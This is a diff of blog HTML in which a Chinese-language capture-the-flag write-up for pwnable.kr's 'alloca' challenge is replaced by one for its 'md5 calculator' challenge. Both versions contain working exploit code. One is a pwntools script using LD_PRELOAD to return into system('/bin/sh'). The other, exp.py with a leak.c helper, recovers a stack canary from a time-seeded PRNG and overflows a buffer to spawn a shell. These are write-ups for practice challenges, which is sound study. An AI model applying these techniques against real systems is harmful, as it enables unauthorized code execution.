@@ -84,16 +84,22 @@
 
 
 
-<meta name="description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
+<meta name="description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
+这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
+要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-alloca">
-<meta property="og:url" content="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/index.html">
+<meta property="og:title" content="pwnable.kr rookiss md5-calculator">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
-<meta property="og:updated_time" content="2016-08-08T08:16:47.000Z">
+<meta property="og:description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
+这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
+要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
+<meta property="og:updated_time" content="2016-08-09T15:52:36.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-alloca">
-<meta name="twitter:description" content="Conclusion0x08048779 &amp;#60;+417&amp;#62;:&amp;#9;call   0x8048560 &amp;#60;check_canary&amp;#62;&amp;#10;0x0804877e &amp;#60;+422&amp;#62;:&amp;#9;mov    eax,0x0&amp;#10;0x08048783 &amp;#60;+427&amp;#62;:&amp;#9;mov    ecx,DWORD PTR [ebp-0x4]&amp;#10;0x">
+<meta name="twitter:title" content="pwnable.kr rookiss md5-calculator">
+<meta name="twitter:description" content="Conclusion之前第一次做没做出来，参考了@ihc童鞋的题解，今天又重新做了一次。
+这个程序的bug出在my_hash函数的返回值泄露了canary的信息，并且process_hash函数存在栈上的缓冲区溢出
+要泄露canary的信息，关键在于程序中的srand(time(0));。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的captcha来算出canary。关于服务器">
 
 
 
@@ -114,9 +120,9 @@
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/"/>
 
-  <title> pwnable.kr-rookiss-alloca | Icemakr's Blog </title>
+  <title> pwnable.kr rookiss md5-calculator | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -286,7 +292,7 @@
             
             
               
-                pwnable.kr-rookiss-alloca
+                pwnable.kr rookiss md5-calculator
               
             
           </h1>
@@ -298,8 +304,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-08T00:00:00+08:00" content="2016-08-08">
-              2016-08-08
+            <time itemprop="dateCreated" datetime="2016-08-09T00:00:00+08:00" content="2016-08-09">
+              2016-08-09
             </time>
           </span>
 
@@ -328,8 +334,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/08/pwnable-rookiss-alloca/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/08/pwnable-rookiss-alloca/" itemprop="commentsCount"></span>
+                <a href="/2016/08/09/pwnable-rookiss-md5-calculator/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/09/pwnable-rookiss-md5-calculator/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -352,23 +358,17 @@
       
 
       
-        <h1 id="Conclusion">Conclusion</h1><figure class="highlight"><table><tr><td class="code"><pre><span class="line">0x08048779 &#60;+417&#62;:&#9;call   0x8048560 &#60;check_canary&#62;&#10;0x0804877e &#60;+422&#62;:&#9;mov    eax,0x0&#10;0x08048783 &#60;+427&#62;:&#9;mov    ecx,DWORD PTR [ebp-0x4]&#10;0x08048786 &#60;+430&#62;:&#9;leave&#10;0x08048787 &#60;+431&#62;:&#9;lea    esp,[ecx-0x4]&#10;0x0804878a &#60;+434&#62;:&#9;ret</span><br></pre></td></tr></table></figure>
-<p>可以看到，0x8048783~0x8048787处的指令的作用相当于调整<code>$esp</code>为<code>$ebp-4</code>指向的内存里的值，只要能劫持<code>$ebp-4</code>处的值，即可控制<code>$esp</code>，之后的<code>ret</code>指令就可以跳转到<code>$esp</code>处存的值所指向的内存，即控制了<code>$eip</code></p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_canary</span><span class="params">(<span class="keyword">int</span> canary)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> result = canary ^ g_canary;</span><br><span class="line">	<span class="keyword">int</span> canary_after = canary;</span><br><span class="line">	<span class="keyword">int</span> canary_before = g_canary;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里会发现，result，canary_after，canary_before都会存在栈上。于是我们可以选取合适的<code>g_canary</code>，利用这个函数，覆盖<code>$ebp-4</code>处的值</p>
-<p>我想到了这里接下去就想不出了，纠结了很久，后来在github上发现了韩国的一位童鞋<a href="https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py" target="_blank" rel="external"><strong>@Yechan Bae</strong></a>写的exp，才意识到这个是本地利用，可以通过<code>ulimit -s unlimited</code>固定libc加载的地址，再通过<code>export LD_PRELOAD=</code>设置环境变量，来存我们的payload。这两个trick实在没想到，折腾了好久。</p>
-<p>只想到了通过alloca来调整<strong>$esp</strong>，使得</p>
+        <h1 id="Conclusion">Conclusion</h1><p>之前第一次做没做出来，参考了<a href="https://gist.github.com/ihciah/948b37ab7587c3f70268" target="_blank" rel="external">@ihc童鞋</a>的题解，今天又重新做了一次。</p>
+<p>这个程序的bug出在<code>my_hash</code>函数的返回值泄露了<strong>canary</strong>的信息，并且<code>process_hash</code>函数存在栈上的缓冲区溢出</p>
+<p>要泄露<strong>canary</strong>的信息，关键在于程序中的<code>srand(time(0));</code>。只要在本地用和服务器同样的时间戳作为seed，就可以通过程序返回的<strong>captcha</strong>来算出<strong>canary</strong>。关于服务器的时间戳，我也是尝试了下，发现跟本机上跟服务器上差了不到10秒，再考虑到网络延时，所以对本机的时间戳叠加了个-10~10的随机数</p>
+<p>搞定了canary之后，后面的就很简单了</p>
 <h1 id="Trick">Trick</h1><ul>
-<li><code>ulimit -s unlimited</code> 对于32位程序可以使<strong>shared object</strong>加载地址固定，但是<strong>stack</strong>的地址仍然是随机的</li>
-<li><code>export PRELOAD=AAAA</code> 程序会去加载名字为AAAA的共享库</li>
+<li>不同函数的canary可能是相同的，可以通过泄露前面调用的函数的canary，然后用它来覆盖后面调用的函数的canary</li>
 </ul>
-<p>这两个配合使用，相当于在程序内获得了一块地址固定的buffer:)</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># ulimit -s unlimited</span></span><br><span class="line"><span class="comment"># export LD_PRELOAD=$(python -c print "\xb0\xa0\x5c\x55deadbeef\x40\xbc\x6e\x55")</span></span><br><span class="line"></span><br><span class="line">off_system  = <span class="number">0x0003f0b0</span>    <span class="comment"># objdump -d /lib/i386-linux-gnu/libc.so.6 | grep system</span></span><br><span class="line">off_shell   = <span class="number">0x00160c40</span>    <span class="comment"># grep -oba /bin/sh /lib/i386-linux-gnu/libc.so.6</span></span><br><span class="line">adr_libc    = <span class="number">0x5558b000</span>    <span class="comment"># ldd alloca</span></span><br><span class="line">adr_payload = <span class="number">0x5557b857</span>    <span class="comment"># info proc mappings ; find 0x5557a000,+0x2000,"\x41\x41\x41\x41"</span></span><br><span class="line"></span><br><span class="line">payload     =   p32(adr_libc + off_system)</span><br><span class="line">payload     +=  p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload     +=  p32(adr_libc + off_shell)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'ulimit -s unlimited'</span>)</span><br><span class="line">p = process(<span class="string">'/home/alloca/alloca'</span>, env = &#123;<span class="string">'LD_PRELOAD'</span>: payload&#125;)</span><br><span class="line">p.sendline(str(-<span class="number">92</span>))                       <span class="comment"># -83 ~ -98 is ok</span></span><br><span class="line">p.sendline(str((adr_payload + <span class="number">4</span>) ^ <span class="number">0x5572fff4</span>))      <span class="comment"># 0x5572fff4 is read from stack</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="Exploit">Exploit</h1><h2 id="exp-py">exp.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os, base64, ctypes, time, urllib2, random</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./hash'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    <span class="comment"># leak info</span></span><br><span class="line">    leak    = os.popen(<span class="string">'./leak '</span> + str(int(time.time()) + random.randint(-<span class="number">10</span>, <span class="number">10</span>))).read().split(<span class="string">'*'</span>)[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    leak    = [int(l) <span class="keyword">for</span> l <span class="keyword">in</span> leak]</span><br><span class="line">    io      = zio(target, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># calc canary</span></span><br><span class="line">    io.read_until(<span class="string">'input captcha : '</span>)</span><br><span class="line">    captcha = int(io.read_line()[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    canary  = captcha - leak[<span class="number">1</span>] - leak[<span class="number">2</span>] + leak[<span class="number">3</span>] - leak[<span class="number">4</span>] - leak[<span class="number">5</span>] + leak[<span class="number">6</span>] - leak[<span class="number">7</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] leak canary : '</span> + hex(ctypes.c_uint32(canary).value)</span><br><span class="line"></span><br><span class="line">    io.writeline(str(captcha))</span><br><span class="line">    io.read_until(<span class="string">'Encode your data with BASE64 then paste me!'</span>)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x8048880</span></span><br><span class="line">    adr_gbuf    = <span class="number">0x804b0e0</span></span><br><span class="line"></span><br><span class="line">    payload  = <span class="string">'A'</span> * <span class="number">0x200</span></span><br><span class="line">    payload += l32(canary)</span><br><span class="line">    payload += <span class="string">'A'</span> * <span class="number">0xc</span></span><br><span class="line">    payload += l32(plt_system)</span><br><span class="line">    payload += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += l32(adr_gbuf + <span class="number">0x2d1</span>)</span><br><span class="line"></span><br><span class="line">    io.writeline(base64.b64encode(payload) + <span class="string">'A/bin/sh'</span>)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp(target)</span><br></pre></td></tr></table></figure>
+<h2 id="leak-c">leak.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">8</span>];</span><br><span class="line">    srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">for</span>(; i &lt; <span class="number">8</span>; i++)&#123;</span><br><span class="line">        a[i] = rand();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d*"</span>, a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h1 id="Referance">Referance</h1><p><a href="https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py" target="_blank" rel="external">https://github.com/Qwaz/solved-hacking-problem/blob/master/pwnable.kr/alloca/payload.py</a></p>
-<p><a href="http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick" target="_blank" rel="external">http://stackoverflow.com/questions/426230/what-is-the-ld-preload-trick</a></p>
-<p><a href="http://stackoverflow.com/questions/5691193/gdb-listing-all-mapped-memory-regions-for-a-crashed-process" target="_blank" rel="external">http://stackoverflow.com/questions/5691193/gdb-listing-all-mapped-memory-regions-for-a-crashed-process</a></p>
-<p><a href="https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html" target="_blank" rel="external">https://sourceware.org/gdb/onlinedocs/gdb/Searching-Memory.html</a></p>
+<h1 id="Referance">Referance</h1><p><a href="https://gist.github.com/ihciah/948b37ab7587c3f70268" target="_blank" rel="external">https://gist.github.com/ihciah/948b37ab7587c3f70268</a></p>
 
       
     </div>
@@ -400,17 +400,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/08/05/pwnable-rookiss-note/" rel="next" title="pwnable.kr-rookiss-note">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-note
+              <a href="/2016/08/09/pwnable-rookiss-fsb/" rel="next" title="pwnable.kr-rookiss-fsb">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-fsb
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/09/pwnable-rookiss-fsb/" rel="prev" title="pwnable.kr-rookiss-fsb">
-                pwnable.kr-rookiss-fsb <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -542,7 +538,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-py"><span class="nav-number">3.1.</span> <span class="nav-text">exp.py</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leak-c"><span class="nav-number">3.2.</span> <span class="nav-text">leak.c</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
             
           </div>
         </section>
@@ -669,9 +665,9 @@
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/08/08/pwnable-rookiss-alloca/';
-      var disqus_title = "pwnable.kr-rookiss-alloca";
-      var disqus_url = 'http://0byjwzsf.me/2016/08/08/pwnable-rookiss-alloca/';
+      var disqus_identifier = '2016/08/09/pwnable-rookiss-md5-calculator/';
+      var disqus_title = "pwnable.kr rookiss md5-calculator";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/09/pwnable-rookiss-md5-calculator/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
